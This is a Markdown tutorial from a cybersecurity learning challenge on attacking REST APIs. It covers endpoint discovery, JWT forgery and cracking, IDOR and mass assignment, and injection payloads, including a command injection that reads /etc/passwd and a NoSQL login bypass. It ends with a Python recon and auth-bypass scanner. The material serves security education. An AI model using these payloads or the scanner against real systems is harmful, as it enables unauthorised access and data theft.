# Day 031 - API Hacking: Finding Vulnerabilities in REST APIs

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

Modern applications don't serve HTML pages anymore.

They serve APIs.

Your banking app, your food delivery app, your social media feed - all talking to REST APIs in the background. Every action you take is an API call.

APIs are the new attack surface. And they're frequently less protected than web interfaces because developers assume "nobody knows about these endpoints."

They're wrong. And today we find them.

---

## 🔍 What Makes APIs Different

```
Web App                    REST API
─────────────────────────────────────────────
Returns HTML               Returns JSON/XML
Visible in browser         Hidden - need tools to see
Usually has WAF            Often no WAF
Has CSRF protection        Often no CSRF protection
Error messages vague       Error messages verbose (debug info)
Rate limiting present      Often missing
Auth via session cookie    Auth via JWT/API key (easy to miss)
```

APIs leak more information in errors.
APIs often skip protections developers add to web UIs.
APIs expose functionality the UI doesn't even show.

---

## 🗺️ Step 1 - API Discovery

Before you can hack an API, you need to find it.

### From the Browser

```bash
# Open DevTools → Network tab
# Browse the application
# Filter by: XHR / Fetch
# Every API call appears here with:
# → Full URL
# → Request method
# → Request headers (including auth tokens)
# → Request body
# → Response body
```

### From JavaScript Files

```bash
# APIs are often referenced in JS source files
# Find JS files in Burp HTTP History
# Search for: api, endpoint, /v1/, /v2/, fetch, axios, XMLHttpRequest

# Automated JS endpoint extraction
python3 -c "
import re, requests
js = requests.get('https://target.com/app.js').text
endpoints = re.findall(r'[\"\'](/api/[^\"\'\s]+)[\"\'']', js)
for e in set(endpoints): print(e)
"
```

### From Documentation

```
Swagger UI:    /swagger-ui, /api-docs, /swagger.json
OpenAPI spec:  /openapi.json, /openapi.yaml
Postman:       Search company name on Postman public workspace
GitHub:        Search org name + "api" in public repos
Wayback:       Check archive.org for old API documentation
```

### Directory Brute Force

```bash
# API-specific wordlists
gobuster dir -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -x json \
  -t 50

# Common API paths to try:
/api
/api/v1
/api/v2
/api/v3
/rest
/graphql
/swagger
/docs
/internal
```

---

## 🔑 Step 2 - Authentication Testing

### JWT (JSON Web Token) Attacks

JWTs are the most common API authentication mechanism.

```
JWT structure: header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9.abc123

Decode with:
echo "eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9" | base64 -d
# {"user":"alice","role":"user"}
```

**Attack 1 - Algorithm None:**
```json
Header: {"alg": "none"}
Payload: {"user": "alice", "role": "admin"}
Signature: (empty)

Some libraries accept this - signature check skipped entirely
```

**Attack 2 - Weak Secret Brute Force:**
```bash
# hashcat cracks JWT secrets
hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt

# john the ripper
john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt
```

**Attack 3 - Privilege Escalation in Payload:**
```
Original JWT payload: {"user": "alice", "role": "user"}
Modified JWT payload: {"user": "alice", "role": "admin"}

If signature isn't verified → admin access
```

### API Key Testing

```bash
# Common API key locations:
# Authorization: Bearer <key>
# X-API-Key: <key>
# api_key=<key> in query string
# apikey=<key> in request body

# Test if key is required:
curl https://api.target.com/users -H "Authorization: Bearer invalid"
# 401 = auth required
# 200 = no auth check

# Test key scope (can user key access admin endpoints?):
curl https://api.target.com/admin/users -H "Authorization: Bearer userkey"
```

---

## 🔢 Step 3 - IDOR in APIs

APIs are especially prone to IDOR - endpoints are predictable and parameters are explicit.

```bash
# Enumerate users
GET /api/v1/users/1    → your profile
GET /api/v1/users/2    → someone else's profile?
GET /api/v1/users/0    → admin account?

# Access other users' resources
GET /api/v1/orders/10042   → your order
GET /api/v1/orders/10041   → another user's order?

# Modify other users' data
PUT /api/v1/users/1337
{"email": "attacker@evil.com"}

# Delete another user's resource
DELETE /api/v1/posts/9999
```

---

## 💉 Step 4 - Injection in API Parameters

APIs accept JSON/XML input - injection still applies.

```bash
# SQLi in JSON body
POST /api/search
{"query": "' OR 1=1--"}

# NoSQL injection (MongoDB)
POST /api/login
{"username": {"$gt": ""}, "password": {"$gt": ""}}
# $gt = greater than empty string = matches everything = auth bypass

# Command injection in API parameter
POST /api/ping
{"host": "127.0.0.1; cat /etc/passwd"}

# SSTI (Server-Side Template Injection)
POST /api/report
{"title": "{{7*7}}"}
# If response contains 49 → SSTI confirmed
```

---

## 🌊 Step 5 - Mass Assignment

APIs sometimes expose internal object properties that shouldn't be modifiable.

```bash
# Normal user registration:
POST /api/register
{"username": "alice", "password": "secret"}

# Try adding privileged fields:
POST /api/register
{
  "username": "alice",
  "password": "secret",
  "role": "admin",
  "is_verified": true,
  "credit_balance": 99999
}

# If the server accepts extra fields without validation →
# you just made yourself an admin with 99,999 credits
```

**Finding hidden fields:**
- Check API documentation / Swagger for full object schema
- Compare registration response to user profile response - extra fields?
- Check source code if available

---

## 💻 The Code - API Recon Tool

```python
"""
Day 031 - API Recon Tool
100 Days of Cybersecurity by Sudeep Ravichandran

Discovers API endpoints, tests authentication,
and probes for common vulnerabilities.

Usage: python3 api_recon.py <base-url>
Requires: pip install requests
"""

import requests
import json
import sys
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings()

# Common API paths to probe
API_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/rest", "/rest/v1", "/graphql",
    "/swagger", "/swagger-ui", "/swagger.json",
    "/api-docs", "/openapi.json", "/openapi.yaml",
    "/docs", "/internal", "/admin", "/api/admin",
    "/api/users", "/api/user", "/api/me",
    "/api/health", "/api/status", "/api/version",
    "/api/config", "/api/debug",
]

HEADERS_TO_TEST = [
    {},
    {"Authorization": "Bearer invalid"},
    {"X-API-Key": "test"},
    {"Authorization": "Bearer null"},
    {"X-Admin": "true"},
    {"X-Internal": "true"},
    {"X-Forwarded-For": "127.0.0.1"},
]


def probe_endpoints(base_url):
    print("\n[+] ENDPOINT DISCOVERY")
    print("-" * 45)
    found = []

    for path in API_PATHS:
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, timeout=5, verify=False,
                           allow_redirects=False)
            if r.status_code not in [404, 410]:
                content_type = r.headers.get("Content-Type", "")
                is_api = "json" in content_type or "xml" in content_type
                tag = "🎯 API" if is_api else "   "
                print(f"  {tag} [{r.status_code}] {url}")
                found.append((url, r.status_code))
        except requests.exceptions.RequestException:
            pass

    return found


def test_auth_bypass(base_url, endpoints):
    print("\n[+] AUTHENTICATION BYPASS TESTS")
    print("-" * 45)

    for url, status in endpoints[:5]:  # test first 5 found
        for headers in HEADERS_TO_TEST:
            try:
                r = requests.get(url, headers=headers,
                               timeout=5, verify=False)
                if r.status_code == 200:
                    header_str = str(headers) if headers else "no headers"
                    print(f"  ⚠  {url}")
                    print(f"     Auth header: {header_str}")
                    print(f"     Response: {r.status_code} "
                          f"({len(r.content)} bytes)")
                    # Show first 100 chars of response
                    try:
                        preview = r.json()
                        print(f"     Preview: {str(preview)[:100]}")
                    except Exception:
                        pass
                    break
            except requests.exceptions.RequestException:
                pass


def test_idor(base_url):
    print("\n[+] IDOR PROBE (numeric ID enumeration)")
    print("-" * 45)

    id_endpoints = [
        "/api/users/{id}",
        "/api/v1/users/{id}",
        "/api/orders/{id}",
        "/api/accounts/{id}",
    ]

    for template in id_endpoints:
        for i in range(1, 6):
            url = urljoin(base_url, template.format(id=i))
            try:
                r = requests.get(url, timeout=5, verify=False)
                if r.status_code == 200:
                    print(f"  [+] {url} → {r.status_code} "
                          f"({len(r.content)} bytes)")
            except requests.exceptions.RequestException:
                pass


def check_swagger(base_url):
    print("\n[+] API DOCUMENTATION CHECK")
    print("-" * 45)

    doc_paths = [
        "/swagger.json", "/openapi.json",
        "/api-docs", "/swagger-ui/index.html"
    ]

    for path in doc_paths:
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, timeout=5, verify=False)
            if r.status_code == 200:
                print(f"  🎯 Documentation found: {url}")
                try:
                    spec = r.json()
                    paths = spec.get("paths", {})
                    print(f"     Endpoints documented: {len(paths)}")
                    for ep in list(paths.keys())[:10]:
                        print(f"     → {ep}")
                except Exception:
                    print(f"     (non-JSON documentation)")
        except requests.exceptions.RequestException:
            pass


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 api_recon.py <base-url>")
        print("Example: python3 api_recon.py https://target.com")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")

    print("=" * 50)
    print("  API Recon Tool - Day 031")
    print("  100 Days of Cybersecurity")
    print("=" * 50)
    print(f"  Target: {base_url}")
    print("  ⚠  Only use on systems you have permission to test")

    check_swagger(base_url)
    found = probe_endpoints(base_url)
    if found:
        test_auth_bypass(base_url, found)
    test_idor(base_url)

    print("\n" + "=" * 50)
    print("  Recon complete.")
    print("  Review findings - test manually in Burp Suite")
    print("=" * 50)


if __name__ == "__main__":
    main()
```

**To run:**
```bash
pip install requests
python3 api_recon.py https://target.com
```

---

## 🔑 Key Takeaways

- APIs are the primary attack surface of modern applications - often less protected than web UIs
- Find APIs via browser DevTools, JS files, Swagger docs, and directory brute force
- JWT attacks (algorithm none, weak secret, payload manipulation) bypass auth entirely
- IDOR is even more common in APIs - endpoints are explicit and predictable
- Mass assignment lets attackers set fields the UI never exposes
- NoSQL injection has different syntax but same impact as SQL injection

---

## 📚 Resources
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [PortSwigger API Testing Labs](https://portswigger.net/web-security/api-testing)
- [jwt.io - decode/inspect JWTs](https://jwt.io/)

---

## [⬅️ Day 030](../day030/) | [➡️ Day 032](../day032/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*